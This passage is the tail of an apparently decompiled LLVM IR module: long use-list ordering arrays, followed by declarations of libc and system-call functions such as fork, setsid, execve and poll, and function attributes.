1326, 1327, 1328, 1329, 1330, 210, 986, 124, 70, 114, 1243, 233, 1660, 1661, 234, 1663, 1662, 96, 362, 987, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 288, 1467, 211, 988, 989, 1468, 1331, 212, 1436, 990, 1437, 1646, 213, 1387, 1668, 1669, 1670, 1050, 1554, 1574, 1051, 1581, 1675, 142, 289, 1636, 1680, 1582, 1637, 1052, 1583, 214, 1053, 1054, 1055, 1056, 1057, 1058, 1060, 1061, 1059, 1062, 1532, 1584, 1585, 1063, 1676, 1677, 874, 219, 366, 853, 220, 367, 854, 1064, 365, 97, 17, 18, 368, 1065, 875, 375, 376, 293, 294, 292, 369, 855, 377, 378, 37, 215, 290, 363, 876, 1066, 216, 291, 364, 873, 1067, 235, 131, 371, 857, 301, 370, 856, 1068, 1069, 1070, 1071, 1073, 243, 1072, 877, 1074, 379, 380, 381, 382, 1075, 858, 859, 372, 373, 374, 252, 253, 254, 99, 1077, 383, 1076, 386, 387, 98, 384, 388, 389, 385, 1078, 390, 1079, 326, 1080, 1081, 1082, 391, 132, 401, 879, 407, 408, 295, 1091, 38, 39, 1090, 878, 880, 409, 410, 398, 1092, 1094, 399, 400, 1093, 239, 1095, 881, 411, 412, 395, 1096, 1098, 396, 397, 1097, 238, 1099, 882, 413, 414, 392, 1100, 1102, 393, 394, 1101, 237, 1103, 327, 1104, 1105, 1106, 1107, 883, 415, 416, 402, 1108, 1110, 403, 404, 1109, 236, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 884, 417, 418, 885, 419, 420, 405, 1121, 886, 421, 422, 406, 1122, 1123, 887, 423, 424, 1124, 1125, 888, 425, 426, 889, 427, 428, 890, 429, 430, 891, 472, 473, 40, 1332, 1333, 41, 74, 100, 1355, 302, 1356, 42, 303, 1357, 221, 1358, 892, 432, 433, 893, 434, 435, 894, 436, 437, 895, 438, 439, 896, 440, 441, 222, 897, 442, 443, 1359, 328, 1360, 1361, 1362, 1363, 431, 1364, 860, 1365, 1366, 133, 1368, 1369, 249, 43, 247, 248, 1370, 329, 1371, 1372, 1373, 1374, 861, 1375, 445, 1376, 862, 444, 246, 244, 44, 245, 863, 1377, 1378, 1379, 1380, 255, 448, 446, 447, 864, 865, 449, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 866, 1016, 1017, 867, 307, 1018, 304, 305, 306, 1019, 1020, 868, 451, 1021, 1388, 1389, 45, 103, 1390, 46, 47, 450, 1391, 101, 75, 102, 452, 869, 15, 256, 257, 258, 1516, 453, 1517, 1518, 1519, 296, 1520, 108, 1521, 1522, 1523, 48, 104, 105, 106, 107, 1525, 49, 50, 51, 52, 53, 9, 10, 11, 12, 1526, 1528, 1529, 1530, 456, 1531, 454, 308, 455, 309, 1527, 330, 457, 458, 297, 310, 298, 13, 299, 898, 459, 1533, 259, 260, 261, 262, 461, 1534, 460, 462, 311, 1535, 1536, 463, 54, 55, 1541, 56, 76, 1542, 312, 1537, 1538, 464, 465, 1539, 1540, 331, 466, 467, 468, 313, 870, 1543, 1555, 1556, 1557, 899, 314, 469, 471, 316, 470, 315, 109, 57, 77, 58, 1558, 474, 59, 110, 475, 476, 1562, 477, 1561, 479, 480, 111, 478, 481, 482, 1569, 1570, 332, 1571, 1572, 134, 1573, 60, 333, 112, 900, 1579, 483, 484, 485, 1580, 487, 486, 1586, 1587, 1588, 1589, 488, 61, 489, 490, 491, 492, 493, 1630, 116, 115, 62, 319, 320, 1621, 1622, 1623, 1624, 240, 317, 318, 321, 1625, 1626, 1627, 1628, 63, 64, 65, 1629, 334, 66, 67, 1631, 1632, 322, 14, 1633, 1634, 1635, 217, 1022, 241, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691 }
  uselistorder i32* @ebx, { 74, 159, 160, 308, 310, 313, 314, 315, 316, 317, 311, 309, 312, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 339, 1, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 352, 350, 351, 353, 354, 272, 273, 161, 162, 163, 355, 2, 356, 357, 358, 3, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 164, 165, 166, 167, 370, 371, 719, 720, 5, 415, 379, 377, 378, 380, 383, 381, 382, 384, 385, 386, 4, 387, 429, 430, 431, 432, 433, 434, 435, 6, 436, 7, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 388, 389, 390, 391, 8, 400, 9, 401, 402, 168, 169, 170, 171, 10, 172, 173, 174, 11, 175, 12, 176, 177, 178, 179, 180, 782, 783, 13, 784, 785, 788, 789, 181, 707, 708, 709, 721, 14, 722, 723, 288, 289, 724, 725, 100, 101, 102, 790, 791, 792, 793, 794, 795, 796, 87, 797, 726, 727, 728, 729, 730, 798, 799, 800, 32, 33, 813, 814, 815, 832, 833, 834, 835, 29, 15, 27, 816, 826, 830, 831, 801, 253, 254, 255, 256, 257, 258, 259, 260, 802, 803, 804, 805, 812, 149, 150, 261, 262, 263, 264, 265, 266, 267, 271, 88, 89, 90, 91, 92, 296, 297, 16, 0, 298, 462, 463, 94, 299, 300, 301, 93, 95, 464, 465, 466, 822, 823, 96, 97, 98, 99, 731, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 17, 746, 747, 732, 733, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 18, 114, 115, 116, 117, 118, 119, 120, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 30, 759, 760, 761, 762, 763, 19, 764, 765, 766, 767, 768, 769, 770, 771, 772, 820, 821, 268, 269, 270, 451, 452, 453, 454, 455, 456, 20, 457, 458, 459, 688, 689, 690, 691, 692, 836, 837, 838, 839, 840, 841, 842, 846, 847, 686, 687, 182, 183, 699, 700, 184, 185, 186, 187, 188, 189, 190, 191, 403, 404, 405, 406, 407, 408, 409, 410, 392, 395, 396, 397, 398, 399, 393, 394, 121, 122, 123, 124, 411, 412, 413, 414, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 226, 227, 21, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 22, 241, 242, 243, 244, 245, 246, 70, 71, 72, 73, 221, 223, 222, 224, 225, 806, 23, 807, 808, 809, 810, 31, 24, 28, 811, 848, 849, 850, 851, 852, 416, 417, 418, 419, 420, 421, 422, 25, 423, 26, 424, 425, 426, 427, 428, 247, 248, 249, 372, 373, 374, 375, 376, 786, 787, 302, 303, 818, 819, 125, 126, 693, 694, 705, 706, 127, 128, 129, 710, 711, 824, 825, 777, 778, 779, 843, 844, 845, 712, 713, 780, 781, 130, 131, 132, 133, 134, 135, 136, 137, 138, 681, 682, 714, 715, 716, 717, 718, 139, 140, 141, 817, 827, 828, 829, 142, 143, 144, 145, 146, 147, 148, 151, 152, 153, 154, 155, 156, 157, 158, 250, 251, 252, 284, 285, 286, 287, 290, 291, 292, 293, 294, 295, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 304, 305, 306, 307, 460, 461, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 683, 684, 685, 695, 696, 697, 698, 701, 702, 703, 704, 773, 774, 775, 776 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
